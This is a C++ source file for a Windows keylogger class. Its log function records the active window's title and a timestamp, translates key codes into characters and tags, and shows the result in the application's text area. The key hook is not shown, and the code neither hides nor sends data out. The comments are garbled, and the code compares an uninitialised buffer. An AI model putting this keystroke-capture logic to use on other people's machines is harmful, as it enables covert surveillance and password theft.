#include "KeyLogger.h"

KeyLogger* KeyLogger::instance = nullptr;

void KeyLogger::log(std::string message)
{
	std::ostringstream oss;
	int key_stroke = atoi(message.c_str());
    if (logSettings->getLoggerState() == KeyLoggerState::LOG_TO_TEXT_AREA) {
		char lastwindow[256];

		if ((key_stroke == 1) || (key_stroke == 2))
			return; // ���������� �������� ������

		HWND foreground = GetForegroundWindow();
		//DWORD threadID;
		//HKL layout = GetKeyboardLayout(0);
		//
		//if (foreground) {
		//	//get keyboard layout of the thread
		//	threadID = GetWindowThreadProcessId(foreground, NULL);
		//	//layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
		//	layout = GetKeyboardLayout(threadID);
		//	std::cout << std::endl << layout << std::endl;
		//}

		//HKL layout{};
		//GUITHREADINFO gti{ sizeof(GUITHREADINFO) };
		//if (GetGUIThreadInfo(NULL, &gti)) //Get keyboard layout of the foreground thread
		//	layout = GetKeyboardLayout(GetWindowThreadProcessId(gti.hwndFocus, NULL));
		//else
		//	layout = GetKeyboardLayout(NULL); //Get keyboard layout of this thread (always const)





		HKL layout{};
		GUITHREADINFO gti{ sizeof(GUITHREADINFO) };
		if (GetGUIThreadInfo(NULL, &gti)) // �������� ��������� ��������� ������ ���������� �����
			layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
		else
			layout = GetKeyboardLayout(NULL); // �������� ��������� ��������� ����� ������ (������ � const)
		
		if (foreground)
		{
			char window_title[256];
			GetWindowText(foreground, window_title, 256);

			if (strcmp(window_title, lastwindow) != 0) {
				strcpy_s(lastwindow, window_title);

				// �������� ���
				time_t t = time(NULL);
				struct tm* tm = localtime(&t);
				char s[64];
				strftime(s, sizeof(s), "%c", tm);

				oss << "\n\n[Window: " << window_title << " - at " << s << "] ";
			}
		}

		if (key_stroke == VK_BACK)
			oss << "[BACKSPACE]";
		else if (key_stroke == VK_RETURN)
			oss << "\n";
		else if (key_stroke == VK_SPACE)
			oss << " ";
		else if (key_stroke == VK_TAB)
			oss << "[TAB]";
		else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
			oss << "[SHIFT]";
		else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
			oss << "[CONTROL]";
		else if (key_stroke == VK_ESCAPE)
			oss << "[ESCAPE]";
		else if (key_stroke == VK_END)
			oss << "[END]";
		else if (key_stroke == VK_HOME)
			oss << "[HOME]";
		else if (key_stroke == VK_LEFT)
			oss << "[LEFT]";
		else if (key_stroke == VK_UP)
			oss << "[UP]";
		else if (key_stroke == VK_RIGHT)
			oss << "[RIGHT]";
		else if (key_stroke == VK_DOWN)
			oss << "[DOWN]";
		else if (key_stroke == 190 || key_stroke == 110)
			oss << ".";
		else if (key_stroke == 189 || key_stroke == 109)
			oss << "-";
		else if (key_stroke == 20)
			oss << "[CAPSLOCK]";
		else {
			char key;
			// �������� Caps Lock
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// �������� ������ shift
			if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
				lowercase = !lowercase;
			}

			// ���������� ��������� ������ �������� �� ��������� ���������
			//key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
			key = MapVirtualKeyExW(key_stroke, MAPVK_VK_TO_CHAR, layout);


			//tolower converts it to lowercase properly
			// tolower ��������� ���������� ���� �� lowercase
			if (!lowercase) key = tolower(key);
			oss << char(key);
		}
		KeyLoggedAreaHolder::getLoggedArea()->Text += "\n" + CastingUtils::castAsString(oss.str());
    }
}

KeyLogger* KeyLogger::getInstance()
{
    if (instance == nullptr) {
        instance = new KeyLogger();
    }
    return instance;
}
